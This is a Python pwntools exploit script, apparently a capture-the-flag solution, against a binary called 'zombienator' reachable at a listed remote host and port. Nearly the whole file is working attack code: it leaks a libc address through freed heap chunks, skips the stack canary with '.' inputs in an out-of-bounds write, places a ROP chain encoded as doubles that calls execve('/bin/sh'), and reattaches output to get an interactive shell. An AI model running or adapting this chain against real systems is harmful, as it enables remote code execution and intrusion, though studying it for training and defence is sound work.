#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './zombienator'
elf = context.binary = ELF(exe, checksec=True)
libc = './glibc/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'info'
context.terminal = ["tmux", "splitw", "-h"]
host, port = '94.237.63.238', 45381

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *attack
break *attack+232
break *attack+152
'''.format(**locals())


# =========================================================
#                         EXPLOITS
# =========================================================
# https://stackoverflow.com/questions/1592158/convert-hex-to-float
def convertToDouble(adrr):
    payload = p64(adrr).hex()
    payload = struct.unpack('d', bytes.fromhex(payload))[0]
    return str(payload).encode()

def create(size, idx):
    info(f'CREATE {idx}')
    io.sendlineafter(b'>>', b'1')
    io.sendlineafter(b':', str(size).encode())
    io.sendlineafter(b':', str(idx).encode())

def delete(idx):
    info(f'DELETE {idx}')
    io.sendlineafter(b'>>', b'2')
    io.sendlineafter(b':', str(idx).encode())

def display(idx):
    info(f'DISPLAY {idx}')
    io.sendlineafter(b'>>', b'3')
    io.recvuntil(f'Slot [{idx}]: '.encode())
    leak = u64(io.recvline().strip().ljust(8, b'\x00'))
    return leak

def exploit():
    global io
    io = initialize()
    rop = ROP(libc)

    for i in range(8): 
        create(130, i)
    create(16, 8)       # wall to prevent wilderness consolidation

    for i in range(7):  # filling tcache 
        delete(i)
    delete(7)           # goes to unsorted_bin

    leak = display(7)
    libc.address = leak - 0x219ce0
    syscall = libc.address + 0x29db4

    payload = [
        libc.address + rop.rdi.address,
        next(libc.search(b'/bin/sh\x00')),
        libc.address + rop.rsi.address,
        0x0,
        libc.address + rop.rdx.address,
        0x0,
        libc.address + rop.rax.address,
        0x3b,
        syscall
    ]

    offset = 35 + len(payload)
    io.sendlineafter(b'>>', b'4')   # attack()
    io.sendlineafter(b':', str(offset).encode()) # loops iter

    for i in range(33): # garbage
        p = convertToDouble(0x0)
        io.sendlineafter(b':', p)

    io.sendlineafter(b':', b'.')    # idx[34] to bypass canary                            
    io.sendlineafter(b':', b'.')    # idx[35] RBP
    
    # actual ROP payload from idx OOB
    for p in payload:
        io.sendlineafter(b':', convertToDouble(p))

    # STDOUT and STDERR are closed upon ROP
    # however STDIN is still open
    io.sendline(b'exec 1>&0') # reestablish STDIN

    info('leak: %#x', leak)
    info('libc addr: %#x', libc.address)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
